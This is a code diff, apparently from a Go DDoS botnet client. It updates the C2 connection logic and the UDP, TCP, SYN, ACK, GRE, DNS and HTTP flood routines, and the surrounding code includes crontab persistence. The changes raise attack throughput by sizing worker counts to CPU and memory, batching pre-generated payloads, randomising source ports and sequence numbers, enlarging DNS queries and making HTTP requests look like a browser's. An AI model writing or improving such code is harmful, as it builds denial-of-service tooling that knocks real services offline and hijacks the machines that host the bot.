@@ -27,9 +27,8 @@ import (
 )
 
 const (
-	C2Address         = "proxy3.example.com:7003"
+	C2Address         = "3proxy.localhost.local:7003"
 	reconnectDelay    = 5 * time.Second
-	numWorkers        = 1024
 	heartbeatInterval = 30 * time.Second
 	maxRetries        = 5
 	baseRetryDelay    = 1 * time.Second
@@ -41,15 +40,10 @@ const (
 )
 
 var (
-	stopChan     = make(chan struct{})
-	statsMutex   sync.Mutex
-	globalStats  = make(map[string]*AttackStats)
-	randMu       sync.Mutex
-	dnsResolvers = []string{
-		"8.8.8.8:53",
-		"1.1.1.1:53",
-		"9.9.9.9:53",
-	}
+	stopChan    = make(chan struct{})
+	statsMutex  sync.Mutex
+	globalStats = make(map[string]*AttackStats)
+	randMu      sync.Mutex
 )
 
 type AttackStats struct {
@@ -62,14 +56,21 @@ type AttackStats struct {
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
+	attempt := 0
 
 	for {
 		conn, err := connectToC2()
 		if err != nil {
-			log.Printf("Connection failed: %v", err)
-			time.Sleep(reconnectDelay)
+			attempt++
+			delay := time.Duration(attempt*attempt) * baseRetryDelay
+			if delay > 30*time.Second {
+				delay = 30 * time.Second
+			}
+			log.Printf("Connection failed (attempt %d): %v, retrying in %v", attempt, err, delay)
+			time.Sleep(delay)
 			continue
 		}
+		attempt = 0
 
 		if err := handleChallenge(conn); err != nil {
 			log.Printf("Challenge failed: %v", err)
@@ -169,7 +170,13 @@ func handleChallenge(conn net.Conn) error {
 }
 
 func computeResponse(challenge string) string {
-	hash := sha256.Sum256([]byte(challenge + "SALT"))
+	// Get the salt from the challenge (assuming challenge format is "challenge:salt")
+	parts := strings.Split(challenge, ":")
+	if len(parts) < 2 {
+		hash := sha256.Sum256([]byte(challenge + "SALT"))
+		return hex.EncodeToString(hash[:])
+	}
+	hash := sha256.Sum256([]byte(parts[0] + parts[1]))
 	return hex.EncodeToString(hash[:])
 }
 
@@ -306,11 +313,36 @@ func performUDPFlood(target string, port, duration int) {
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
 
+	// Pre-generate random payloads to reduce lock contention
+	payloads := make([][]byte, 100)
+	for i := range payloads {
+		size := getRandomInt(512, 2048)
+		payloads[i] = make([]byte, size)
+		rand.Read(payloads[i])
+	}
+
 	var wg sync.WaitGroup
-	for i := 0; i < numWorkers; i++ {
+	workers := calculateWorkers()
+
+	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
+
+			// Create connection with random source port
+			localAddr := &net.UDPAddr{IP: net.IPv4zero, Port: getRandomPort()}
+			remoteAddr := &net.UDPAddr{IP: net.ParseIP(target), Port: port}
+
+			conn, err := net.DialUDP("udp", localAddr, remoteAddr)
+			if err != nil {
+				return
+			}
+			defer conn.Close()
+
+			// Batch writes for better performance
+			batchSize := 5
+			payloadIndex := 0
+
 			for {
 				select {
 				case <-ctx.Done():
@@ -318,32 +350,25 @@ func performUDPFlood(target string, port, duration int) {
 				case <-stopChan:
 					return
 				default:
-					if err := sendUDPPacket(target, port); err != nil {
-						atomic.AddInt64(&stats.Errors, 1)
-					} else {
-						atomic.AddInt64(&stats.PacketsSent, 1)
+					// Cycle through pre-generated payloads
+					payload := payloads[payloadIndex]
+					payloadIndex = (payloadIndex + 1) % len(payloads)
+
+					// Send multiple packets per write when possible
+					for j := 0; j < batchSize; j++ {
+						_, err := conn.Write(payload)
+						if err != nil {
+							atomic.AddInt64(&stats.Errors, 1)
+							break // Exit batch on error
+						} else {
+							atomic.AddInt64(&stats.PacketsSent, 1)
+						}
 					}
 				}
 			}
 		}()
 	}
 	wg.Wait()
-}
-
-func sendUDPPacket(target string, port int) error {
-	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
-	if err != nil {
-		return err
-	}
-	defer conn.Close()
-
-	payload := make([]byte, 1024)
-	randMu.Lock()
-	rand.Read(payload)
-	randMu.Unlock()
-
-	_, err = conn.Write(payload)
-	return err
 }
 
 func performSmartUDP(target string, port, duration int) {
@@ -366,7 +391,8 @@ func performSmartUDP(target string, port, duration int) {
 	defer cancel()
 
 	var wg sync.WaitGroup
-	for i := 0; i < numWorkers; i++ {
+	workers := calculateWorkers()
+	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -425,11 +451,39 @@ func performTCPFlood(target string, port, duration int) {
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
 
+	// Pre-generate various payload sizes and contents
+	payloads := make([][]byte, 10)
+	for i := range payloads {
+		size := getRandomInt(512, 4096) // Larger payload range
+		payloads[i] = make([]byte, size)
+		rand.Read(payloads[i])
+	}
+
 	var wg sync.WaitGroup
-	for i := 0; i < numWorkers; i++ {
+	workers := calculateWorkers() * 2 // Double the workers for TCP
+	sourcePorts := make(chan int, workers)
+	for i := 0; i < workers; i++ {
+		sourcePorts <- getRandomPort()
+	}
+
+	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
+
+			srcPort := <-sourcePorts
+			defer func() { sourcePorts <- srcPort }()
+
+			dialer := &net.Dialer{
+				Timeout:   3 * time.Second, // Reduced timeout
+				KeepAlive: 0,
+				LocalAddr: &net.TCPAddr{
+					IP:   net.IPv4zero,
+					Port: srcPort,
+				},
+			}
+
+			payloadIndex := 0
 			for {
 				select {
 				case <-ctx.Done():
@@ -437,32 +491,39 @@ func performTCPFlood(target string, port, duration int) {
 				case <-stopChan:
 					return
 				default:
-					if err := sendTCPPacket(target, port); err != nil {
+					conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
+					if err != nil {
 						atomic.AddInt64(&stats.Errors, 1)
-					} else {
-						atomic.AddInt64(&stats.PacketsSent, 1)
+						time.Sleep(100 * time.Millisecond) // Brief pause on error
+						continue
 					}
+
+					// Cycle through pre-generated payloads
+					payload := payloads[payloadIndex]
+					payloadIndex = (payloadIndex + 1) % len(payloads)
+
+					// Send multiple writes per connection
+					for j := 0; j < 3; j++ { // Send 3 payloads per connection
+						_, err = conn.Write(payload)
+						if err != nil {
+							atomic.AddInt64(&stats.Errors, 1)
+							break
+						} else {
+							atomic.AddInt64(&stats.PacketsSent, 1)
+						}
+					}
+
+					// Enable TCP_NODELAY for faster transmission
+					if tcpConn, ok := conn.(*net.TCPConn); ok {
+						tcpConn.SetNoDelay(true)
+					}
+
+					conn.Close()
 				}
 			}
 		}()
 	}
 	wg.Wait()
-}
-
-func sendTCPPacket(target string, port int) error {
-	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target, port), 5*time.Second)
-	if err != nil {
-		return err
-	}
-	defer conn.Close()
-
-	payload := make([]byte, 1024)
-	randMu.Lock()
-	rand.Read(payload)
-	randMu.Unlock()
-
-	_, err = conn.Write(payload)
-	return err
 }
 
 func performSYNFlood(target string, port, duration int) {
@@ -485,7 +546,8 @@ func performSYNFlood(target string, port, duration int) {
 	defer cancel()
 
 	var wg sync.WaitGroup
-	for i := 0; i < numWorkers; i++ {
+	workers := calculateWorkers()
+	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -507,6 +569,7 @@ func performSYNFlood(target string, port, duration int) {
 						DstPort: layers.TCPPort(port),
 						SYN:     true,
 						Window:  65535,
+						Seq:     rand.Uint32(),
 					}
 
 					buf := gopacket.NewSerializeBuffer()
@@ -553,7 +616,8 @@ func performACKFlood(target string, port, duration int) {
 	defer cancel()
 
 	var wg sync.WaitGroup
-	for i := 0; i < numWorkers; i++ {
+	workers := calculateWorkers()
+	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -575,6 +639,7 @@ func performACKFlood(target string, port, duration int) {
 						DstPort: layers.TCPPort(port),
 						ACK:     true,
 						Window:  65535,
+						Seq:     rand.Uint32(),
 					}
 
 					buf := gopacket.NewSerializeBuffer()
@@ -621,7 +686,8 @@ func performGREFlood(target string, duration int) {
 	defer cancel()
 
 	var wg sync.WaitGroup
-	for i := 0; i < numWorkers; i++ {
+	workers := calculateWorkers()
+	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -684,7 +750,8 @@ func performDNSFlood(target string, port, duration int) {
 	defer cancel()
 
 	var wg sync.WaitGroup
-	for i := 0; i < numWorkers; i++ {
+	workers := calculateWorkers()
+	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -730,6 +797,7 @@ func constructDNSQuery(domain string) *dns.Msg {
 	msg := new(dns.Msg)
 	msg.SetQuestion(dns.Fqdn(domain), dns.TypeA)
 	msg.RecursionDesired = true
+	msg.SetEdns0(4096, false)
 	return msg
 }
 
@@ -758,7 +826,8 @@ func performHTTPFlood(target string, port, duration int) {
 	}
 
 	var wg sync.WaitGroup
-	for i := 0; i < numWorkers; i++ {
+	workers := calculateWorkers()
+	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -790,6 +859,10 @@ func sendHTTPRequest(client *http.Client, target string, port int) error {
 
 	req.Header.Set("User-Agent", getRandomUserAgent())
 	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+	req.Header.Set("Connection", "close")
+	req.Header.Set("Cache-Control", "no-cache")
+	req.Header.Set("Pragma", "no-cache")
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -861,6 +934,24 @@ func createCronJob(exePath string) error {
 	cronJob := fmt.Sprintf("@reboot %s > /dev/null 2>&1", exePath)
 	cmd := exec.Command("sh", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
 	return cmd.Run()
+}
+
+func calculateWorkers() int {
+	mem, err := mem.VirtualMemory()
+	if err != nil {
+		return 512
+	}
+	cores := runtime.NumCPU()
+	availableMB := mem.Available / 1024 / 1024
+
+	workersPerCore := 256
+	if availableMB < 1024 {
+		workersPerCore = 64
+	} else if availableMB < 2048 {
+		workersPerCore = 128
+	}
+
+	return cores * workersPerCore
 }
 
 func getRandomPort() int {
